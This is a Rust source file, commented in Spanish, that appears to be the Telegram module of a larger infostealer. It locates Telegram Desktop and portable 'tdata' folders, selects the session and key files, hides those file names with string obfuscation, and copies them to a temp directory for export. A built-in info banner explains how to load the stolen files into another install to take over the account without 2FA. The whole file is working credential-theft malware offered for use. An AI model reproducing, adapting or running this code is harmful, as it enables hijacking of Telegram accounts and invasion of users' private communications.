// Stealer de sesiones de Telegram
use crate::stealer::common::get_appdata_roaming;
use obfstr::obfstr;
use std::fs;
use std::path::PathBuf; // ← Ofuscación de strings

/// Datos de sesión de Telegram robados
#[derive(Debug, Clone)]
pub struct TelegramSession {
    pub app_type: String, // Telegram Desktop, Telegram Portable, etc.
    pub path: PathBuf,
    pub files: Vec<String>,
}

impl TelegramSession {
    pub fn to_string(&self) -> String {
        let mut output = format!("[{}]\n", self.app_type);
        output.push_str(&format!("Path: {}\n", self.path.display()));
        output.push_str(&format!("Files: {}\n", self.files.join(", ")));
        output
    }
}

/// Roba todas las sesiones de Telegram disponibles
pub fn steal_telegram_sessions() -> Vec<TelegramSession> {
    let mut sessions = Vec::new();

    // Telegram Desktop (instalación estándar)
    sessions.extend(steal_telegram_desktop());

    // Telegram Portable
    sessions.extend(steal_telegram_portable());

    sessions
}

/// Roba sesión de Telegram Desktop
fn steal_telegram_desktop() -> Vec<TelegramSession> {
    let mut sessions = Vec::new();

    let roaming_appdata = match get_appdata_roaming() {
        Some(path) => path,
        None => return sessions,
    };

    // Telegram Desktop guarda datos en %APPDATA%\Telegram Desktop\tdata
    let telegram_path = roaming_appdata
        .join(obfstr!("Telegram Desktop"))
        .join(obfstr!("tdata"));

    if !telegram_path.exists() {
        return sessions;
    }

    let mut session_files = Vec::new();

    // Archivos críticos de Telegram:
    // - key_datas (archivo más importante - contiene la clave de encriptación)
    // - D877F783D5D3EF8C* (archivos de sesión)
    // - map* (mapeo de archivos)
    // - settings* (configuraciones)

    if let Ok(entries) = fs::read_dir(&telegram_path) {
        for entry in entries.flatten() {
            let file_name = entry.file_name().to_string_lossy().to_string();
            let path = entry.path();

            // Ignorar directorios y archivos muy grandes
            if path.is_dir() {
                continue;
            }

            // Obtener tamaño del archivo
            let file_size = match fs::metadata(&path) {
                Ok(metadata) => metadata.len(),
                Err(_) => continue,
            };

            // Ignorar archivos mayores a 10MB (probablemente cache)
            if file_size > 10 * 1024 * 1024 {
                continue;
            }

            // Archivos importantes (OFUSCADOS):
            let is_important = file_name == obfstr!("key_datas") ||              // ¡MUY IMPORTANTE! Clave de sesión
                file_name == obfstr!("key_data") ||
                file_name.starts_with(obfstr!("D877F783D5D3EF8C")) ||  // Archivos de sesión
                file_name.starts_with(obfstr!("map")) ||          // Mapeo
                file_name.starts_with(obfstr!("settings")) ||     // Configuraciones
                file_name.ends_with("s") && file_name.len() == 17; // Archivos de sesión hexadecimal

            if is_important {
                session_files.push(file_name);
            }
        }
    }

    if !session_files.is_empty() {
        sessions.push(TelegramSession {
            app_type: obfstr!("Telegram Desktop").to_string(),
            path: telegram_path,
            files: session_files,
        });
    }

    sessions
}

/// Roba sesión de Telegram Portable
fn steal_telegram_portable() -> Vec<TelegramSession> {
    let mut sessions = Vec::new();

    // Telegram Portable puede estar en varios lugares:
    // 1. Desktop
    // 2. Downloads
    // 3. Unidad USB (D:\, E:\, etc.)

    let user_profile = match std::env::var("USERPROFILE") {
        Ok(path) => PathBuf::from(path),
        Err(_) => return sessions,
    };

    let search_paths = vec![
        user_profile.join("Desktop"),
        user_profile.join("Downloads"),
        user_profile.join("Documents"),
    ];

    for base_path in search_paths {
        if !base_path.exists() {
            continue;
        }

        // Buscar carpetas ofuscadas
        if let Ok(entries) = fs::read_dir(&base_path) {
            for entry in entries.flatten() {
                let path = entry.path();

                if !path.is_dir() {
                    continue;
                }

                let dir_name = entry.file_name().to_string_lossy().to_lowercase();

                if dir_name.contains(obfstr!("telegram")) {
                    // Buscar subcarpeta tdata
                    let tdata_path = path.join(obfstr!("tdata"));

                    if tdata_path.exists() {
                        if let Some(session) =
                            extract_telegram_session(&tdata_path, obfstr!("Telegram Portable"))
                        {
                            sessions.push(session);
                        }
                    }
                }
            }
        }
    }

    sessions
}

/// Extrae archivos de sesión de una carpeta tdata
fn extract_telegram_session(tdata_path: &PathBuf, app_type: &str) -> Option<TelegramSession> {
    let mut session_files = Vec::new();

    if let Ok(entries) = fs::read_dir(tdata_path) {
        for entry in entries.flatten() {
            let file_name = entry.file_name().to_string_lossy().to_string();
            let path = entry.path();

            if path.is_dir() {
                continue;
            }

            // Verificar tamaño
            let file_size = match fs::metadata(&path) {
                Ok(metadata) => metadata.len(),
                Err(_) => continue,
            };

            if file_size > 10 * 1024 * 1024 {
                continue;
            }

            // Archivos importantes (OFUSCADOS)
            let is_important = file_name == obfstr!("key_datas")
                || file_name == obfstr!("key_data")
                || file_name.starts_with(obfstr!("D877F783D5D3EF8C"))
                || file_name.starts_with(obfstr!("map"))
                || file_name.starts_with(obfstr!("settings"))
                || (file_name.ends_with("s") && file_name.len() == 17);

            if is_important {
                session_files.push(file_name);
            }
        }
    }

    if session_files.is_empty() {
        return None;
    }

    Some(TelegramSession {
        app_type: app_type.to_string(),
        path: tdata_path.clone(),
        files: session_files,
    })
}

/// Exporta sesión de Telegram copiándola a un directorio temporal
pub fn export_telegram_session(session: &TelegramSession) -> Option<PathBuf> {
    let temp_dir = std::env::temp_dir();
    let export_dir = temp_dir.join(format!("telegram_{}", session.app_type.replace(" ", "_")));

    // Crear directorio de exportación
    if let Err(_) = fs::create_dir_all(&export_dir) {
        return None;
    }

    // Copiar archivos
    for file_name in &session.files {
        let src = session.path.join(file_name);
        let dst = export_dir.join(file_name);

        let _ = fs::copy(&src, &dst);
    }

    Some(export_dir)
}

/// Información sobre la sesión de Telegram robada
pub fn get_telegram_info() -> String {
    let info = r#"
╔════════════════════════════════════════════════════════════╗
║              TELEGRAM SESSION STEALER INFO                ║
╚════════════════════════════════════════════════════════════╝

📱 Archivos Robados:
   • key_datas    - Clave principal de encriptación
   • D877F783*    - Archivos de sesión
   • map*         - Mapeo de archivos
   • settings*    - Configuraciones del usuario

🔑 Importancia:
   El archivo key_datas es CRÍTICO - contiene la clave de 
   encriptación local. Con este archivo + archivos de sesión,
   se puede acceder completamente a la cuenta de Telegram.

💡 Cómo usar:
   1. Copiar carpeta tdata completa
   2. Reemplazar en otra instalación de Telegram
   3. Abrir Telegram - sesión iniciada automáticamente

⚠️  Nota:
   Telegram NO requiere 2FA si tienes acceso a los archivos
   de sesión locales. La sesión permanece activa.
"#;

    info.to_string()
}
